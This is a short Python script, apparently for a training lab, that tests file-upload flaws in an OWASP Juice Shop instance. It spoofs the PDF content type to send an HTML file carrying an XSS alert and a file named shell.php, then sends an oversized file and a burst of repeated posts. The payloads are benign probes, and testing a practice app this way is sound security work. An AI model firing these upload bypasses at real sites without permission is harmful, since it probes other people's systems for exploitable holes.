#!/usr/bin/env python3
# Owner: Louis. Malicious file upload against Juice Shop; one --case per run
# (renamed_extension, dangerous_extension, oversized, fuzz_endpoint).

import argparse
import os
import requests

URL = os.environ.get("JS_TARGET", "http://192.168.100.51:3000").rstrip("/") + "/file-upload"
TOKEN = os.environ.get("JS_TOKEN", "")
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

parser = argparse.ArgumentParser()
parser.add_argument("--case", required=True,
                    choices=["renamed_extension", "dangerous_extension", "oversized", "fuzz_endpoint"])
args = parser.parse_args()

os.makedirs("payloads", exist_ok=True)
os.chdir("payloads")


def send(local_path, sent_name, content_type, write_bytes):
    with open(local_path, "wb" if isinstance(write_bytes, bytes) else "w") as f:
        f.write(write_bytes)
    with open(local_path, "rb") as f:
        files = {"file": (sent_name, f, content_type)}
        r = requests.post(URL, headers=HEADERS, files=files, timeout=5)
    print(f"[*] Sent: {sent_name} as {content_type} | Status: {r.status_code}")
    return r


if args.case == "renamed_extension":        # disallowed .html extension on disk
    send("malicious_upload.html", "malicious_upload.html", "application/pdf",
         "<html><script>alert('xss')</script></html>")

elif args.case == "dangerous_extension":    # dangerous .php extension
    send("shell.php", "shell.php", "application/pdf",
         "<?php echo 'test'; ?>")

elif args.case == "oversized":              # over the 100000 byte limit
    send("oversized.pdf", "oversized.pdf", "application/pdf",
         b"\x00" * 150000)

elif args.case == "fuzz_endpoint":          # repeated POSTs to trip the threshold
    for i in range(5):
        send(f"fuzz_{i}.pdf", f"fuzz_{i}.pdf", "application/pdf",
             f"fuzz attempt {i}")
